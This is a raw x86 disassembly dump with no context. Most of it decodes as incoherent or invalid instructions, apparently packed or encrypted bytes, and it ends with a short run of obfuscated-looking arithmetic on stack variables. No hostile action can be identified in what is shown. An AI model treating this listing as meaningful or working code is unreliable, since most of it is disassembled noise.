  418a44:	mov    ebx,0x5e19b8b8
  418a49:	test   al,0x32
  418a4b:	push   ebx
  418a4c:	adc    BYTE PTR ds:0x85a9678,0xc5
  418a53:	pop    eax
  418a54:	mov    dh,0x5e
  418a56:	inc    edi
  418a57:	out    0xb,eax
  418a59:	fcomp  QWORD PTR [edi]
  418a5b:	daa    
  418a5c:	js     0x418a05
  418a5e:	(bad)  
  418a5f:	sar    DWORD PTR [eax-0xbf6f6eb],0x34
  418a66:	xor    ecx,DWORD PTR [ebx+eax*1]
  418a69:	and    ah,BYTE PTR [ebx]
  418a6b:	(bad)  
  418a6c:	and    bl,BYTE PTR [edx+0x3c]
  418a6f:	js     0x4189fe
  418a71:	stos   DWORD PTR es:[edi],eax
  418a72:	out    0xa0,eax
  418a74:	inc    ebp
  418a75:	pusha  
  418a76:	add    DWORD PTR [ebx+ebp*8+0x77],ebx
  418a7a:	pop    ebx
  418a7b:	jo     0x418a2c
  418a7d:	mov    cl,0xe6
  418a7f:	mov    edi,?
  418a81:	clc    
  418a82:	das    
  418a83:	inc    ebp
  418a84:	inc    ebp
  418a85:	cmp    al,0xf0
  418a87:	add    BYTE PTR [esi],0xfc
  418a8a:	fisubr DWORD PTR [esi+0x6c]
  418a8d:	mov    WORD PTR [eiz*1-0x9b2642],gs
  418a94:	(bad)  
  418a95:	aad    0x21
  418a97:	push   es
  418a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a99:	dec    esi
  418a9a:	xor    eax,DWORD PTR [edi-0x9]
  418a9d:	mov    dl,0xf7
  418a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aa0:	mov    cl,0x19
  418aa2:	cmp    DWORD PTR [eax+0x5d],ecx
  418aa5:	pop    es
  418aa6:	mov    ecx,0x82a5714
  418aab:	je     0x418ae0
  418aad:	test   BYTE PTR [edx],bh
  418aaf:	push   esp
  418ab0:	imul   edi,DWORD PTR [edx-0x4b],0x395ae56b
  418ab7:	adc    al,0x87
  418ab9:	(bad)  
  418aba:	sbb    eax,0x5dab8612
  418abf:	mov    dh,0xf0
  418ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ac2:	arpl   WORD PTR [edi+0x21],dx
  418ac5:	xchg   esp,eax
  418ac6:	pop    edi
  418ac7:	outs   dx,BYTE PTR ds:[esi]
  418ac8:	push   edx
  418ac9:	int3   
  418aca:	fcmovbe st,st(4)
  418acc:	cmp    DWORD PTR [esi+ebx*4],eax
  418acf:	in     al,0xba
  418ad1:	fwait
  418ad2:	jae    0x418ab8
  418ad4:	mov    DWORD PTR [ebp+0x1a],0x3c5021cf
  418adb:	pop    es
  418adc:	aas    
  418add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ade:	stc    
  418adf:	mov    ch,BYTE PTR [esi]
  418ae1:	or     eax,0xe632950e
  418ae6:	cmp    bh,BYTE PTR [eax]
  418ae8:	xchg   ecx,eax
  418ae9:	hlt    
  418aea:	(bad)  
  418aeb:	jmp    0xb4d22a51
  418af0:	xor    ebx,edi
  418af2:	lods   al,BYTE PTR ds:[esi]
  418af3:	std    
  418af4:	imul   esp,DWORD PTR [esi],0xffffffa3
  418af7:	sahf   
  418af8:	mov    eax,0x9498da1a
  418afd:	ds jns 0x418a9e
  418b00:	jmp    0x20796190
  418b05:	pop    ds
  418b06:	mov    DWORD PTR [ecx+edi*1],esi
  418b09:	or     al,0xcf
  418b0b:	fcomi  st,st(6)
  418b0d:	push   ebx
  418b0e:	jae    0x418aa1
  418b10:	jle    0x418b3c
  418b12:	loopne 0x418b44
  418b14:	(bad)  
  418b15:	imul   ebx,DWORD PTR [esi+0x24b183aa],0x6f
  418b1c:	lgs    edi,FWORD PTR [eax]
  418b1f:	je     0x418b37
  418b21:	xchg   ebx,edx
  418b23:	loope  0x418aef
  418b25:	test   al,0xb4
  418b27:	push   0xfa6401e2
  418b2c:	xor    al,0x8a
  418b2e:	sub    al,0x2a
  418b30:	sub    DWORD PTR [eax-0x66],edx
  418b33:	cs sahf 
  418b35:	push   ebx
  418b36:	mov    ecx,0xd2d20ce
  418b3b:	jb     0x418b5b
  418b3d:	das    
  418b3e:	(bad)  
  418b3f:	and    eax,0x8c11b355
  418b44:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b46:	cmp    BYTE PTR [ecx-0x54abf30d],bh
  418b4c:	lea    esp,[edx]
  418b4e:	dec    edx
  418b4f:	outs   dx,DWORD PTR ds:[esi]
  418b50:	scas   al,BYTE PTR es:[edi]
  418b51:	loop   0x418b28
  418b53:	ds jae 0x418b1b
  418b56:	std    
  418b57:	pop    edx
  418b58:	mov    ebx,DWORD PTR [ebx-0xe]
  418b5b:	seta   BYTE PTR [esi+ebx*1+0x6a]
  418b60:	pop    edi
  418b61:	sbb    dl,0x59
  418b64:	push   0x7b
  418b66:	(bad)  
  418b67:	cmp    eax,0x58a27521
  418b6c:	adc    BYTE PTR [ebx],al
  418b6e:	xor    al,0xd8
  418b70:	jo     0x418b12
  418b72:	push   esi
  418b73:	mov    ecx,esi
  418b75:	ds retf 0xf836
  418b79:	stos   DWORD PTR es:[edi],eax
  418b7a:	or     BYTE PTR [edi+0x33210f17],bh
  418b80:	and    ecx,DWORD PTR [ebx+0x11]
  418b83:	jg     0x418baa
  418b85:	jmp    0x118a398
  418b8a:	lods   al,BYTE PTR ds:[esi]
  418b8b:	mov    ebp,0xe90ca03a
  418b90:	xchg   BYTE PTR [eax],cl
  418b92:	jae    0x418bea
  418b94:	add    eax,0xa57f7e9d
  418b99:	(bad)  
  418b9a:	sbb    BYTE PTR [esi],cl
  418b9c:	xor    esi,DWORD PTR [edx+0x26769d5f]
  418ba2:	inc    ebx
  418ba3:	ror    esi,cl
  418ba5:	in     eax,dx
  418ba6:	inc    BYTE PTR [ebx+ebp*2]
  418ba9:	add    ecx,ebx
  418bab:	adc    ebp,DWORD PTR [ebx+0x7d512304]
  418bb1:	add    edi,0xf17813c0
  418bb7:	or     BYTE PTR [esi+0x8bf2917],bh
  418bbd:	xor    al,0x4c
  418bbf:	cmp    dh,BYTE PTR [esi+edx*4]
  418bc2:	dec    edi
  418bc3:	retf   0x584c
  418bc6:	jb     0x418bfe
  418bc8:	pop    esi
  418bc9:	iret   
  418bca:	xor    BYTE PTR [ebx-0x7e],0x6f
  418bce:	repz or eax,0x75a4a3f2
  418bd4:	xor    dh,BYTE PTR [ecx+0x53]
  418bd7:	adc    al,BYTE PTR [ebx+0x3accc431]
  418bdd:	outs   dx,BYTE PTR ds:[esi]
  418bde:	test   al,0x92
  418be0:	loope  0x418bda
  418be2:	mov    esi,0xf75fa1a8
  418be7:	pop    edx
  418be8:	mov    ch,0x2f
  418bea:	sbb    edx,DWORD PTR [edi-0x14]
  418bed:	inc    ecx
  418bee:	xchg   edi,eax
  418bef:	nop
  418bf0:	js     0x418bb9
  418bf2:	stos   DWORD PTR es:[edi],eax
  418bf3:	or     BYTE PTR [eax],bl
  418bf5:	div    DWORD PTR [ebx+eax*1+0xf]
  418bf9:	cmp    BYTE PTR [ebx],al
  418bfb:	push   esp
  418bfc:	dec    esi
  418bfd:	retf   
  418bfe:	adc    cl,BYTE PTR [edx+0x6f33e5d]
  418c04:	lds    esp,FWORD PTR es:[ecx-0x9]
  418c08:	in     eax,0xde
  418c0a:	ret    
  418c0b:	repnz stc 
  418c0d:	mov    ecx,0x830a3cc3
  418c12:	or     eax,0xbab5a52d
  418c17:	(bad)  
  418c18:	and    bh,BYTE PTR [edx-0x52cfb0ec]
  418c1e:	hlt    
  418c1f:	push   eax
  418c20:	cmp    DWORD PTR [esi],edi
  418c22:	out    dx,al
  418c23:	xchg   DWORD PTR [ebp+0x5c6d3c6b],ecx
  418c29:	in     eax,0xa7
  418c2b:	jecxz  0x418c8e
  418c2d:	(bad)  
  418c2e:	arpl   WORD PTR [edi-0x20],cx
  418c31:	outs   dx,BYTE PTR ds:[esi]
  418c32:	repnz mov bh,0xa4
  418c35:	sub    dh,BYTE PTR [edi+0x4e]
  418c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c39:	stos   DWORD PTR es:[edi],eax
  418c3a:	sub    al,0xbc
  418c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c3d:	xor    eax,DWORD PTR [esi]
  418c3f:	int    0x88
  418c41:	cmp    eax,0x75adec66
  418c46:	push   ebx
  418c47:	jg     0x418bd2
  418c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4a:	lea    ecx,[ecx]
  418c4c:	and    BYTE PTR [eax-0x4ee4de1e],dh
  418c52:	rol    cl,1
  418c54:	leave  
  418c55:	idiv   BYTE PTR cs:[edi-0x72]
  418c59:	mov    eax,ds:0x2718211f
  418c5e:	cdq    
  418c5f:	(bad)  
  418c60:	mov    ecx,0x3a8db7
  418c65:	mov    bh,0x7c
  418c67:	jl     0x418c19
  418c69:	dec    edi
  418c6a:	test   al,0x83
  418c6c:	ret    
  418c6d:	push   0xffffffe1
  418c6f:	stos   DWORD PTR es:[edi],eax
  418c70:	cmp    DWORD PTR [ecx],ebx
  418c72:	mov    DWORD PTR [esi],0x46abc879
  418c78:	inc    ecx
  418c79:	(bad)  
  418c7a:	ss dec esp
  418c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c7d:	jns    0x418c8e
  418c7f:	mov    ebx,0xed5e9a68
  418c84:	pop    eax
  418c85:	test   DWORD PTR [eax+0x5c],ecx
  418c88:	inc    esi
  418c89:	xchg   esp,eax
  418c8a:	es inc esi
  418c8c:	div    BYTE PTR ss:[ebp+0x4b3b9f]
  418c93:	call   0x646:0x4e0d1c03
  418c9a:	mov    al,0xe7
  418c9c:	jo     0x418c53
  418c9e:	dec    esi
  418c9f:	mov    dh,0x33
  418ca1:	lea    ebx,[ebp+0x20]
  418ca4:	mov    WORD PTR [eax-0x4a6f69c0],gs
  418caa:	loop   0x418d0d
  418cac:	inc    ecx
  418cad:	shr    BYTE PTR [ebx-0x44d7d32e],0xc7
  418cb4:	xlat   BYTE PTR ds:[ebx]
  418cb5:	ja     0x418d1b
  418cb7:	and    BYTE PTR [ebx],bl
  418cb9:	leave  
  418cba:	stos   BYTE PTR es:[edi],al
  418cbb:	adc    bl,BYTE PTR [ecx-0x9]
  418cbe:	arpl   WORD PTR [ebp-0x9421cd5],bx
  418cc4:	push   edi
  418cc5:	inc    esp
  418cc6:	or     BYTE PTR [ecx+0x61],cl
  418cc9:	cmp    DWORD PTR [esi-0x3d],ecx
  418ccc:	jbe    0x418d38
  418cce:	inc    edi
  418ccf:	mov    al,0x4e
  418cd1:	push   es
  418cd2:	outs   dx,DWORD PTR ds:[esi]
  418cd3:	xor    eax,0x5d4eab15
  418cd8:	and    dh,ch
  418cda:	test   BYTE PTR [eax-0x18],bl
  418cdd:	popa   
  418cde:	jp     0x418c7c
  418ce0:	add    eax,0xdfed0eb4
  418ce5:	loop   0x418ced
  418ce7:	xor    eax,0x9a9c1ef
  418cec:	test   eax,0x78fcbc79
  418cf1:	repnz dec eax
  418cf3:	mov    WORD PTR [ebp-0x28],?
  418cf6:	xchg   esi,eax
  418cf7:	pop    ss
  418cf8:	ret    
  418cf9:	adc    al,0xaf
  418cfb:	inc    edx
  418cfc:	in     eax,dx
  418cfd:	mov    dl,0xa5
  418cff:	mov    bl,0x24
  418d01:	sub    eax,DWORD PTR [eax-0x48]
  418d04:	push   es
  418d05:	je     0x418d41
  418d07:	loopne 0x418cb9
  418d09:	lods   eax,DWORD PTR ds:[esi]
  418d0a:	pop    es
  418d0b:	dec    esi
  418d0c:	or     eax,0xa40c7e30
  418d11:	sub    ecx,DWORD PTR [edx+0x7d]
  418d14:	or     ecx,eax
  418d16:	pop    ss
  418d17:	retf   0x3969
  418d1a:	popa   
  418d1b:	xchg   BYTE PTR [edi-0x45c0fd2d],dl
  418d21:	jno    0x418cb1
  418d23:	int3   
  418d24:	adc    dh,al
  418d26:	push   ebp
  418d27:	iret   
  418d28:	jp     0x418d49
  418d2a:	inc    eax
  418d2b:	push   0x4d7d0442
  418d30:	cmp    al,0xc2
  418d32:	mov    dh,0xf0
  418d34:	neg    edi
  418d36:	shr    BYTE PTR [ecx],0x4e
  418d39:	sbb    al,BYTE PTR [eax]
  418d3b:	rsm    
  418d3d:	iret   
  418d3e:	es push 0xffffffba
  418d41:	push   eax
  418d42:	arpl   si,dx
  418d44:	sbb    DWORD PTR [esi+eax*4],edi
  418d47:	out    0x62,eax
  418d49:	shl    DWORD PTR ds:0x89fed766,0xb4
  418d50:	fmul   QWORD PTR [edi]
  418d52:	pop    edx
  418d53:	sbb    cl,BYTE PTR [eax]
  418d55:	(bad)  
  418d56:	loopne 0x418cd9
  418d58:	mov    dl,0x7e
  418d5a:	mov    al,ds:0x14a8a91d
  418d5f:	or     DWORD PTR [ebp-0x6ed9a9c5],esi
  418d65:	jno    0x418d4f
  418d67:	and    al,BYTE PTR [edi-0x316fe9ae]
  418d6d:	fidiv  WORD PTR [edi-0x54]
  418d70:	sub    al,0x16
  418d72:	retf   
  418d73:	mov    bh,0xe
  418d75:	imul   ebp,DWORD PTR [ebx-0x145932de],0x4a
  418d7c:	cmp    eax,0xbb668c2f
  418d81:	(bad)  
  418d82:	push   ebp
  418d83:	jle    0x418e00
  418d85:	popa   
  418d86:	imul   esi,DWORD PTR [ecx-0x23],0x85b74812
  418d8d:	mov    ecx,0x9fc373dd
  418d92:	and    DWORD PTR [esi+0x7b],eax
  418d95:	outs   dx,BYTE PTR ds:[esi]
  418d96:	jno    0x418d61
  418d98:	sbb    dl,BYTE PTR [edx-0x15]
  418d9b:	jo     0x418dca
  418d9d:	repz dec ebx
  418d9f:	cmp    BYTE PTR [ecx+0x5],0xd2
  418da3:	jnp    0x418d90
  418da5:	or     DWORD PTR [ecx],edx
  418da7:	ss pop edx
  418da9:	imul   ecx,edx,0x4
  418dac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dad:	aam    0x7b
  418daf:	push   0x2ab10ba9
  418db4:	pop    eax
  418db5:	cli    
  418db6:	retf   0x86c8
  418db9:	aam    0xcb
  418dbb:	mov    al,0xc9
  418dbd:	or     bh,dl
  418dbf:	loope  0x418da1
  418dc1:	mov    eax,0x1afc9aea
  418dc6:	aam    0x37
  418dc8:	out    dx,eax
  418dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dca:	push   0xd6e08d51
  418dcf:	shl    DWORD PTR [esi],0x3b
  418dd2:	dec    edx
  418dd3:	add    BYTE PTR [ecx],ah
  418dd5:	xor    eax,0xf3f492e0
  418dda:	or     edi,ebx
  418ddc:	jp     0x418e0c
  418dde:	and    DWORD PTR [ebx+0x0],esp
  418de1:	into   
  418de2:	jle    0x418e41
  418de4:	and    al,BYTE PTR [eax-0x6079e43]
  418dea:	les    eax,FWORD PTR ds:0xfcc3858d
  418df0:	jno    0x418e25
  418df2:	scas   al,BYTE PTR es:[edi]
  418df3:	out    dx,eax
  418df4:	out    0x47,eax
  418df6:	retf   
  418df7:	xor    ch,bl
  418df9:	clc    
  418dfa:	daa    
  418dfb:	xor    BYTE PTR [edi-0x2c],dl
  418dfe:	stc    
  418dff:	jne    0x418e7a
  418e01:	cmc    
  418e02:	stos   BYTE PTR es:[edi],al
  418e03:	call   0xd38ca292
  418e08:	mov    edx,0x36c7cda5
  418e0d:	ret    
  418e0e:	rcl    DWORD PTR [edi-0x23],1
  418e11:	xchg   ebx,eax
  418e12:	mov    esp,0xbd691754
  418e17:	ja     0x418dad
  418e19:	mov    dh,0x42
  418e1b:	mov    al,ds:0xa0351efa
  418e20:	xchg   esi,eax
  418e21:	and    BYTE PTR [ecx-0x68a43c13],bh
  418e27:	leave  
  418e28:	jl     0x418e1e
  418e2a:	pop    ebx
  418e2b:	pushf  
  418e2c:	mov    bh,0x30
  418e2e:	hlt    
  418e2f:	xchg   edx,eax
  418e30:	(bad)  
  418e32:	mov    ds:0x7247572,eax
  418e37:	dec    esi
  418e38:	push   cs
  418e39:	call   0x1c5b0834
  418e3e:	jno    0x418dc2
  418e40:	or     edx,DWORD PTR [ebp-0x7683e6b3]
  418e46:	push   edi
  418e47:	push   es
  418e48:	ins    DWORD PTR es:[edi],dx
  418e49:	sbb    eax,0x8489fb2e
  418e4e:	es enter 0x93e4,0x46
  418e53:	adc    eax,0xe6d37da5
  418e58:	pop    ecx
  418e59:	cmp    al,0xa2
  418e5b:	in     eax,0xce
  418e5d:	jecxz  0x418e37
  418e5f:	sbb    DWORD PTR [esi-0x72],edx
  418e62:	(bad)  
  418e63:	jmp    0x418e7a
  418e65:	push   es
  418e66:	and    al,0xfb
  418e68:	fwait
  418e69:	pop    es
  418e6a:	call   0xecff:0x52113de
  418e71:	pop    ds
  418e72:	test   BYTE PTR [esp+eax*1+0x44],0x23
  418e77:	or     ebp,DWORD PTR [edx]
  418e79:	add    al,0xaa
  418e7b:	sub    DWORD PTR [edi+0xd],ebx
  418e7e:	push   esi
  418e7f:	jle    0x418eae
  418e81:	add    al,0x14
  418e83:	sbb    BYTE PTR [edi+0x2fba8721],0x43
  418e8a:	repz add BYTE PTR [ebp-0x2],0xfa
  418e8f:	pop    ecx
  418e90:	outs   dx,BYTE PTR ds:[esi]
  418e91:	mov    ds:0xa15b1e28,eax
  418e96:	or     cl,BYTE PTR [ecx+0x2b940bc1]
  418e9c:	cmp    DWORD PTR [ecx],esi
  418e9e:	cs cs loopne 0x418e66
  418ea2:	fbstp  TBYTE PTR [edi+0x353af5fb]
  418ea8:	ja     0x418ee4
  418eaa:	add    edi,edi
  418eac:	ret    0x2809
  418eaf:	mov    edi,0x630885dc
  418eb4:	aad    0x38
  418eb6:	out    dx,eax
  418eb7:	inc    edi
  418eb8:	call   0x65126b10
  418ebd:	sahf   
  418ebe:	jb     0x418ebd
  418ec0:	aad    0x29
  418ec2:	mov    dl,0x15
  418ec4:	(bad)  
  418ec5:	ins    BYTE PTR es:[edi],dx
  418ec6:	mov    ebp,0x2ab782a5
  418ecb:	mov    ebp,0xa16ba430
  418ed0:	(bad)  
  418ed1:	call   0x13e5c3bb
  418ed6:	in     eax,dx
  418ed7:	cmp    BYTE PTR [ebx+0x19],ch
  418eda:	xchg   ebp,eax
  418edb:	inc    edx
  418edc:	and    eax,DWORD PTR [eax+0x62]
  418edf:	sub    al,0xe1
  418ee1:	or     eax,0xb08b1e37
  418ee6:	jecxz  0x418ebe
  418ee8:	lahf   
  418ee9:	add    dl,BYTE PTR [edx-0x4ae48862]
  418eef:	lods   al,BYTE PTR ds:[esi]
  418ef0:	dec    ecx
  418ef1:	mov    al,ds:0x94fc6dac
  418ef6:	lods   al,BYTE PTR ds:[esi]
  418ef7:	out    0xff,al
  418ef9:	cmp    eax,0x1cca83b2
  418efe:	repnz mov ecx,0x94fdbd22
  418f04:	mov    ds:0x590e038f,eax
  418f09:	inc    eax
  418f0a:	out    dx,al
  418f0b:	xchg   edi,eax
  418f0c:	or     al,0xcf
  418f0e:	call   0x2908fe45
  418f13:	dec    edi
  418f14:	mov    al,bl
  418f16:	jg     0x418ef7
  418f18:	inc    DWORD PTR [edx]
  418f1a:	test   al,0x38
  418f1c:	aaa    
  418f1d:	cmp    DWORD PTR [esi-0x10],ecx
  418f20:	mov    bh,0xf5
  418f22:	mov    al,0x8c
  418f24:	gs mov bx,0x6ae7
  418f29:	repz or al,0x6a
  418f2c:	rcl    ah,cl
  418f2e:	mov    ah,0x50
  418f30:	gs aas 
  418f32:	lods   al,BYTE PTR ds:[esi]
  418f33:	icebp  
  418f34:	xchg   ecx,eax
  418f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f36:	inc    esi
  418f37:	inc    esp
  418f38:	xor    cl,BYTE PTR [ebx+0x396d4d48]
  418f3e:	dec    ebx
  418f3f:	cwde   
  418f40:	imul   eax,edx,0xd0d2184d
  418f46:	jmp    0x7d5cc3c0
  418f4b:	adc    ebx,eax
  418f4d:	pusha  
  418f4e:	arpl   WORD PTR [esi-0x3c],sp
  418f51:	inc    esi
  418f52:	mov    eax,ds:0x34ac9f14
  418f57:	stos   DWORD PTR es:[edi],eax
  418f58:	and    bh,BYTE PTR [ebp+0x1a8ad437]
  418f5e:	mov    eax,ds:0x36bc591f
  418f63:	dec    edi
  418f64:	neg    DWORD PTR [ebp+ebp*1-0x483294cd]
  418f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f6d:	out    dx,al
  418f6e:	or     edx,DWORD PTR [ebp-0x41]
  418f71:	cdq    
  418f72:	pop    esp
  418f73:	cdq    
  418f74:	cmp    eax,0x16
  418f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f78:	out    0x1d,al
  418f7a:	(bad)  
  418f7b:	jmp    0x1a19145e
  418f80:	je     0x418fca
  418f82:	in     al,0xc5
  418f84:	xor    eax,0xf2f840f1
  418f89:	test   edi,ecx
  418f8b:	rcr    DWORD PTR [ebx],0x3b
  418f8e:	sub    DWORD PTR [esi+ecx*4],ebx
  418f91:	aad    0x70
  418f93:	xchg   ebx,eax
  418f94:	xchg   edi,eax
  418f95:	fwait
  418f96:	mov    esp,0x44ed4c7b
  418f9c:	push   ebx
  418f9d:	(bad)  
  418f9e:	loopne 0x418f2e
  418fa0:	nop
  418fa1:	mov    dl,0xa9
  418fa3:	movups xmm1,XMMWORD PTR [edi]
  418fa6:	repz inc ecx
  418fa8:	push   ebx
  418fa9:	(bad)
  418fad:	mov    ecx,ebp
  418faf:	rcr    dl,0x64
  418fb2:	dec    ecx
  418fb3:	rol    BYTE PTR [esi-0x52],cl
  418fb6:	cmp    DWORD PTR [ebx],ebp
  418fb8:	adc    BYTE PTR [ebp+0x4c8330b4],al
  418fbe:	mov    dh,0x6b
  418fc0:	cdq    
  418fc1:	xchg   DWORD PTR [edx-0x6f7cfecf],edi
  418fc7:	pop    edx
  418fc8:	mov    dh,0x86
  418fca:	ret    
  418fcb:	(bad)  
  418fcc:	fnstsw WORD PTR [ecx+ebx*1-0x32]
  418fd0:	mov    dh,BYTE PTR [ecx-0x7239f590]
  418fd6:	adc    esi,esi
  418fd8:	and    ecx,DWORD PTR [edx]
  418fda:	jno    0x418ffc
  418fdc:	xor    DWORD PTR ds:[ecx],eax
  418fdf:	ins    DWORD PTR es:[edi],dx
  418fe0:	add    DWORD PTR [edx+0x6752f8c],ebx
  418fe6:	test   DWORD PTR [ecx+edi*8],esi
  418fe9:	sub    al,0x62
  418feb:	(bad)  
  418fec:	cmp    al,0x14
  418fee:	ret    0x78d6
  418ff1:	imul   BYTE PTR [eax]
  418ff3:	call   0xd49c:0xd02bd246
  418ffa:	in     eax,0xdd
  418ffc:	loopne 0x418ffb
  418ffe:	xchg   ecx,eax
  418fff:	push   esp
  419000:	adc    BYTE PTR [edx+0x5c],ah
  419003:	test   BYTE PTR ds:0xf2907701,bh
  419009:	push   eax
  41900a:	jge    0x418fac
  41900c:	sub    bh,ah
  41900e:	dec    edx
  41900f:	sar    DWORD PTR [edx-0x50],cl
  419012:	pop    ecx
  419013:	sub    dl,dl
  419015:	jns    0x418fad
  419017:	ss in  al,dx
  419019:	add    dh,al
  41901b:	push   eax
  41901c:	popf   
  41901d:	ins    BYTE PTR es:[edi],dx
  41901e:	cmp    ebp,ebp
  419020:	cld    
  419021:	imul   ebx,DWORD PTR [esi+edx*8+0x79bafb56],0xffffffaf
  419029:	call   0xd4692d68
  41902e:	ds std 
  419030:	(bad)  
  419031:	xor    al,ah
  419033:	adc    ebx,ebp
  419035:	sub    BYTE PTR [ebx-0x69e1d71],0xc5
  41903c:	mov    edi,?
  41903e:	shl    edx,cl
  419040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419041:	jae    0x41903f
  419043:	mul    DWORD PTR [esi]
  419045:	iret   
  419046:	test   DWORD PTR [edi-0x692d5fb2],ecx
  41904c:	sbb    DWORD PTR [eax+0x29],0x4d
  419050:	stos   DWORD PTR es:[edi],eax
  419051:	enter  0x133a,0x60
  419055:	mov    bl,0xe7
  419057:	cmp    edx,DWORD PTR [edx+0x50]
  41905a:	rcl    BYTE PTR [esi+0xfd2da13],0x9f
  419061:	mov    edx,0x9a8004b9
  419066:	ret    
  419067:	xlat   BYTE PTR ds:[ebx]
  419068:	mov    ebp,0xfff6e39d
  41906d:	fwait
  41906e:	adc    eax,0x8f945cc1
  419073:	shl    BYTE PTR [ebp-0x38],0x40
  419077:	fistp  QWORD PTR [ebx+0x7]
  41907a:	jnp    0x419059
  41907c:	lods   eax,DWORD PTR ds:[esi]
  41907d:	je     0x419043
  41907f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419080:	jo     0x41908a
  419082:	(bad)  
  419084:	mov    ebp,0xfc87a5ce
  419089:	test   eax,0x93f257a0
  41908e:	sub    al,0xbd
  419090:	mov    ch,BYTE PTR [ebp-0x4d]
  419093:	cs ffree st(6)
  419096:	cdq    
  419097:	out    0xf6,eax
  419099:	adc    cl,BYTE PTR [eax]
  41909b:	xor    esp,DWORD PTR [edx-0x6a051cc7]
  4190a1:	call   0x6c4f7fb0
  4190a6:	push   cs
  4190a7:	fdiv   st(3),st
  4190a9:	shr    BYTE PTR [ebp+0x51e64a7d],cl
  4190af:	or     DWORD PTR [eax-0x2181e2e],0x2f54cb8d
  4190b9:	add    DWORD PTR [edx-0x11],ebx
  4190bc:	icebp  
  4190bd:	loop   0x419084
  4190bf:	mov    DWORD PTR ds:0x2a44c373,edx
  4190c5:	test   DWORD PTR [edx-0x7b],ebp
  4190c8:	dec    ebx
  4190c9:	mov    BYTE PTR [ecx-0x6b],dl
  4190cc:	out    dx,eax
  4190cd:	enter  0x8fc4,0x5
  4190d1:	shl    BYTE PTR [edx+0x15abd617],1
  4190d7:	(bad)  [esi-0x53]
  4190da:	aam    0xdf
  4190dc:	(bad)
  4190e1:	pop    ds
  4190e2:	iret   
  4190e3:	xor    ch,cl
  4190e5:	js     0x4190db
  4190e7:	sub    ecx,DWORD PTR [edx-0x70fdcbc2]
  4190ed:	push   cs
  4190ee:	push   es
  4190ef:	sbb    ebp,DWORD PTR [esi-0x32]
  4190f2:	(bad)  
  4190f3:	gs sahf 
  4190f5:	mov    ah,0x28
  4190f7:	inc    ecx
  4190f8:	fidivr DWORD PTR [eax+0x3e]
  4190fb:	xchg   ecx,eax
  4190fc:	sbb    ch,ah
  4190fe:	inc    eax
  4190ff:	xor    esp,ebx
  419101:	sub    ebp,DWORD PTR [edi+0x3]
  419104:	or     BYTE PTR [ebx],cl
  419106:	jno    0x41914d
  419108:	add    eax,0xacaf935
  41910d:	jmp    0x41909b
  41910f:	sub    DWORD PTR [edi+esi*8],edx
  419112:	mov    al,0x2d
  419114:	jmp    0x4190a1
  419116:	popa   
  419117:	cli    
  419118:	push   edi
  419119:	xchg   BYTE PTR [esi-0x4],al
  41911c:	fisub  WORD PTR [ebx+esi*2-0x24]
  419120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419121:	sbb    eax,0x83cf27fb
  419126:	cmp    dh,ah
  419128:	push   cs
  419129:	mov    ch,0xe9
  41912b:	push   ebx
  41912c:	jbe    0x41915c
  41912e:	ins    DWORD PTR es:[edi],dx
  41912f:	cdq    
  419130:	add    edi,ebx
  419132:	push   ds
  419133:	mov    al,0x41
  419135:	mov    bl,0xba
  419137:	imul   edx,DWORD PTR [esp+eax*1],0xfadc4e79
  41913e:	ds inc edx
  419140:	jb     0x41919d
  419142:	mov    DWORD PTR [ebp-0x50],edx
  419145:	mov    edx,DWORD PTR [ebp+0x8]
  419148:	mov    ebx,DWORD PTR [ebp-0x4c]
  41914b:	add    edx,edi
  41914d:	and    edx,ebx
  41914f:	mov    DWORD PTR [ebp-0x4c],edx
  419152:	mov    edx,DWORD PTR [ebp+0x8]
  419155:	mov    ebx,DWORD PTR [ebp-0x48]
  419158:	lea    edx,[ebx+edx*1+0x241fcdf]
  41915f:	mov    DWORD PTR [ebp-0x48],edx
  419162:	mov    edx,DWORD PTR [ebp+0x8]
  419165:	mov    ebx,0xfa5e1524
  41916a:	sub    ebx,edx
  41916c:	add    ebx,DWORD PTR [ebp-0x44]
  41916f:	mov    DWORD PTR [ebp-0x44],ebx
  419172:	mov    edx,DWORD PTR [ebp+0x8]
  419175:	xor    edx,eax
  419177:	add    edx,esi
  419179:	jne    0x416da2
  41917f:	mov    edx,DWORD PTR [ebp-0x8]
  419182:	mov    ebx,DWORD PTR [ebp-0xc]
  419185:	xor    edx,eax
  419187:	lea    edx,[edx+ebx*1+0x3272f5]
  41918e:	mov    DWORD PTR [ebp-0xc],edx
  419191:	mov    edx,DWORD PTR [ebp-0x10]
  419194:	xor    edx,eax
  419196:	add    edx,esi
  419198:	jne    0x4124bd
  41919e:	jmp    0x41b615
  4191a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4191a6:	mov    DWORD PTR [ebp+0x8],ecx
  4191a9:	jmp    0x41b582
  4191ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4191b1:	mov    edx,DWORD PTR [ebp-0x8]
  4191b4:	xor    ecx,eax
  4191b6:	xor    edx,eax
  4191b8:	sub    ecx,edx
  4191ba:	sub    ecx,esi
  4191bc:	xor    ecx,eax
  4191be:	mov    DWORD PTR [ebp+0x8],ecx
  4191c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4191c4:	mov    edx,DWORD PTR [ebp-0x58]
  4191c7:	add    ecx,0x5708e2
  4191cd:	imul   ecx,edx
  4191d0:	mov    DWORD PTR [ebp-0x58],ecx
